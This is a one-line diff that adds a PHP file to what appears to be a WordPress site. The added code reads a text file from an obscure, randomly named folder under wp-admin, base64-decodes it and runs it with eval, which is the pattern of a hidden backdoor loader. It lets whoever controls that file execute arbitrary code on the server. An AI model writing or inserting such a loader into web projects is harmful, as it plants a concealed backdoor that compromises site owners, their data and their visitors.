@@ -1,0 +1,1 @@
+<?php $code=file_get_contents($_SERVER['DOCUMENT_ROOT'] .'/wp-admin/sisisij/gaibfebchb.txt');$code=base64_decode($code);eval('?>' . $code);
